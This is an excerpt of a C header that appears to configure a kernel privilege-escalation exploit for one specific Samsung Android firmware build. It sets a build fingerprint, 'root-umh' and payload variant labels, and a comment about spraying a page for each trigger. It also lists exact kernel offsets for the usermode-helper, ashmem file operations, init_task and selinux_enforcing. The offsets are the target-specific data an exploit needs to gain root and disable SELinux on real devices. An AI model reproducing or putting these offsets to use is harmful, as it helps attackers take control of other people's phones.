...
#define BUILD_VARIANT_LABEL "a36xq-S366VUDS8CZF1-app-p0-baseline"
#define APP_PHYS_P0_ORACLE 1
#define APP_PHYS_VIRTUAL_BASE_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "a36xq-S366VUDS8CZF1-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a36xqtfn/a36xq:16/BP4A.251205.006/S366VUDS8CZF1_TFN8CZF1:user/release-keys"
#endif
...
#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8060000000ULL
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d98e4ULL
...
#if defined(APP_PAYLOAD) && APP_PAYLOAD
/* Same-SoC A366W race and gate parameters, A366B exact-build offsets. */
...
/* Rebuild the sprayed page for each physical trigger. */
...
#define P0_FINGERPRINT_HEADER \
  "targets/a36xq-S366VUDS8CZF1/p0_fingerprint.h"
#endif
...
/* Exact S366VUDS8CZF1 offsets. */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0fa4ULL
#define NOOP_LLSEEK_OFF 0x003c7b24ULL
#define COPY_SPLICE_READ_OFF 0x00415044ULL
#define CONFIGFS_READ_ITER_OFF 0x00491934ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00491e60ULL
#define ASHMEM_IOCTL_OFF 0x00d60b8cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d61248ULL
#define ASHMEM_MMAP_OFF 0x00d6129cULL
#define ASHMEM_OPEN_OFF 0x00d614bcULL
#define ASHMEM_RELEASE_OFF 0x00d61544ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00d615d0ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0123cc48ULL
#define ASHMEM_FOPS_OFF 0x013fad80ULL
#define KMALLOC_CACHES_OFF 0x017c5b10ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x022cae60ULL
#define INIT_TASK_OFF 0x022de340ULL
#define ASHMEM_MISC_OFF 0x0244c360ULL
#define ROOT_TASK_GROUP_OFF 0x024ea580ULL
#define SELINUX_ENFORCING_OFF 0x0252c598ULL
#define SYSCTL_BOOTID_OFF 0x0260f1a0ULL
